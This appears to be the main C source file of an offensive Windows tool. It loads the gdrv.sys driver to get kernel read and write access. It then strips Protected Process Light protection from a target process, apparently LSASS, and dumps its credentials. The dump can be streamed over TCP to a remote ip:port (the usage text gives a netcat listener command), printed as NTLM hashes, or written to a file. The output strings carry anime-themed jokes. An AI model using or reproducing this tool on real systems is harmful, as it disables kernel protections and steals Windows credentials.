#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include "gio.h"
#include "eprocess.h"
#include "dump.h"
#include "banner.h"

#define DRIVER_FILENAME L"gdrv.sys"

typedef enum {
    MODE_STRIP_ONLY,    /* Just strip PPL, no dump */
    MODE_REMOTE,        /* Strip + stream minidump over TCP */
    MODE_DIRECT,        /* Strip + extract creds in-memory */
    MODE_LOCAL          /* Strip + write minidump to file */
} DUMP_MODE;

static void banner(void) {
    print_banner();
}

static void usage(const wchar_t* exe) {
    banner();
    printf("  Usage:\n");
    printf("    %ls <PID>                       Strip PPL only\n", exe);
    printf("    %ls <PID> --remote <ip:port>    Strip + stream minidump\n", exe);
    printf("    %ls <PID> --direct              Strip + print NTLM hashes\n", exe);
    printf("    %ls <PID> --dump <path>         Strip + write minidump to file\n", exe);
    printf("\n");
    printf("  Modes:\n");
    printf("    --remote <ip:port>  Build minidump in memory, stream over TCP\n");
    printf("                        Catch with: nc -lvp <port> > lsass.dmp\n");
    printf("                        Parse with: pypykatz lsa minidump lsass.dmp\n");
    printf("\n");
    printf("    --direct            Parse MSV1_0 credentials directly from\n");
    printf("                        LSASS memory. Prints NTLM hashes to console.\n");
    printf("                        No files, no network. Win10 1607+ / Win11.\n");
    printf("\n");
    printf("    --dump <path>       Write minidump to local file.\n");
    printf("                        Parse with: pypykatz lsa minidump <path>\n");
    printf("\n");
    printf("  Example:\n");
    printf("    %ls 672 --remote 10.0.0.5:4444\n", exe);
    printf("    %ls 672 --direct\n", exe);
    printf("    %ls 672 --dump C:\\temp\\lsass.dmp\n", exe);
    printf("\n");
    printf("  Requires administrator privileges.\n");
    printf("  Darkness blacker than black and darker than dark,\n");
    printf("  I beseech thee, combine with my deep crimson.\n\n");
}

static BOOL parse_host_port(const wchar_t* arg, char* host, DWORD host_sz,
    USHORT* port) {
    /* Convert wide to narrow */
    char narrow[256];
    int len = WideCharToMultiByte(CP_ACP, 0, arg, -1, narrow, sizeof(narrow),
        NULL, NULL);
    if (len <= 0) return FALSE;

    /* Find last ':' for port */
    char* colon = strrchr(narrow, ':');
    if (!colon) return FALSE;

    *colon = '\0';
    DWORD plen = (DWORD)(colon - narrow);
    if (plen >= host_sz) return FALSE;

    memcpy(host, narrow, plen);
    host[plen] = '\0';

    int p = atoi(colon + 1);
    if (p <= 0 || p > 65535) return FALSE;
    *port = (USHORT)p;

    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
    if (argc < 2) {
        usage(argv[0]);
        return 1;
    }

    DWORD target_pid = (DWORD)_wtoi(argv[1]);
    if (target_pid == 0) {
        printf("[-] Invalid PID: %ls\n", argv[1]);
        return 1;
    }

    /* Parse mode */
    DUMP_MODE mode = MODE_STRIP_ONLY;
    char remote_host[256] = { 0 };
    USHORT remote_port = 0;
    const wchar_t* dump_path = NULL;

    for (int i = 2; i < argc; i++) {
        if (wcscmp(argv[i], L"--remote") == 0) {
            if (i + 1 >= argc) {
                printf("[-] --remote requires <ip:port> argument\n");
                return 1;
            }
            if (!parse_host_port(argv[i + 1], remote_host,
                sizeof(remote_host), &remote_port)) {
                printf("[-] Invalid address format. Use: ip:port\n");
                return 1;
            }
            mode = MODE_REMOTE;
            i++;  /* skip next arg */
        }
        else if (wcscmp(argv[i], L"--direct") == 0) {
            mode = MODE_DIRECT;
        }
        else if (wcscmp(argv[i], L"--dump") == 0) {
            if (i + 1 >= argc) {
                printf("[-] --dump requires <path> argument\n");
                return 1;
            }
            dump_path = argv[i + 1];
            mode = MODE_LOCAL;
            i++;  /* skip next arg */
        }
        else {
            printf("[-] Unknown option: %ls\n", argv[i]);
            usage(argv[0]);
            return 1;
        }
    }

    banner();

    const char* mode_str[] = { "strip only", "remote dump", "direct read", "local dump" };
    printf("[~] Target acquired! PID %lu (%s)\n", target_pid, mode_str[mode]);

    /* Resolve EPROCESS offset */
    DWORD prot_offset = get_protection_offset();
    if (prot_offset == 0) {
        printf("[x] Spell fizzled! Can't resolve EPROCESS offset for this build\n");
        return 1;
    }

    /* Build driver path (same folder as exe) */
    WCHAR driver_path[MAX_PATH];
    WCHAR exe_dir[MAX_PATH];
    GetModuleFileNameW(NULL, exe_dir, MAX_PATH);
    wchar_t* last_slash = wcsrchr(exe_dir, L'\\');
    if (last_slash) *(last_slash + 1) = L'\0';
    wsprintfW(driver_path, L"%s%s", exe_dir, DRIVER_FILENAME);
    printf("[~] Channeling mana from %ls\n", driver_path);

    if (!gio_install(driver_path)) {
        printf("[x] Mana channel failed! Driver won't load\n");
        return 1;
    }
    printf("[+] Staff equipped! Driver loaded\n");

    /* Open device handle */
    HANDLE hDevice = gio_open();
    if (!hDevice) {
        gio_uninstall();
        return 1;
    }

    int ret = 1;

    /* Find target EPROCESS */
    ULONG_PTR eprocess = find_eprocess(target_pid);
    if (!eprocess) {
        printf("[x] Can't find target... nothing to explode!\n");
        goto cleanup;
    }

    /* Read current protection */
    ULONG_PTR prot_addr = eprocess + prot_offset;
    PS_PROTECTION current_prot = { 0 };

    if (!gio_read_kernel(hDevice, prot_addr, &current_prot, sizeof(current_prot))) {
        printf("[x] Target is warded! Can't read protection\n");
        goto cleanup;
    }

    printf("[~] Scanning target defenses...\n");
    print_protection(current_prot);

    if (current_prot.Type == PS_PROTECTED_TYPE_NONE) {
        printf("[!] Target is already unprotected, no explosion needed\n");
    }
    else {
        /* EKUSUPUROOOOOSION!! */
        printf("\n");
        printf("    The time of awakening cometh.\n");
        printf("    Be the foothold of the collapse.\n");
        printf("\n");
        printf("         * * *  EKUSUPUROOOOOSION!!  * * *\n");
        printf("\n");

        PS_PROTECTION new_prot = { 0 };
        if (!gio_write_kernel(hDevice, prot_addr, &new_prot, sizeof(new_prot))) {
            printf("[x] Explosion misfired! Write failed\n");
            goto cleanup;
        }

        /* Verify */
        PS_PROTECTION verify_prot = { 0 };
        gio_read_kernel(hDevice, prot_addr, &verify_prot, sizeof(verify_prot));

        if (verify_prot.Type == PS_PROTECTED_TYPE_NONE) {
            printf("[+] PPL obliterated! Protection is no more\n");
            print_protection(verify_prot);
        }
        else {
            printf("[x] Target survived?! Impossible!\n");
            print_protection(verify_prot);
            goto cleanup;
        }
    }

    /* Execute dump mode */
    printf("\n[~] Now then... let me take a look at your memories~\n\n");

    switch (mode) {
    case MODE_REMOTE:
        if (dump_remote(target_pid, remote_host, remote_port))
            ret = 0;
        break;

    case MODE_DIRECT:
        if (dump_direct(target_pid))
            ret = 0;
        break;

    case MODE_LOCAL:
        if (dump_local(target_pid, dump_path))
            ret = 0;
        break;

    case MODE_STRIP_ONLY:
    default:
        printf("[+] PPL stripped! No dump mode selected\n");
        ret = 0;
        break;
    }

cleanup:
    gio_close(hDevice);
    gio_uninstall();
    printf("\n[~] *collapses* ...mana spent. Cleanup done. Worth it.\n");

    return ret;
}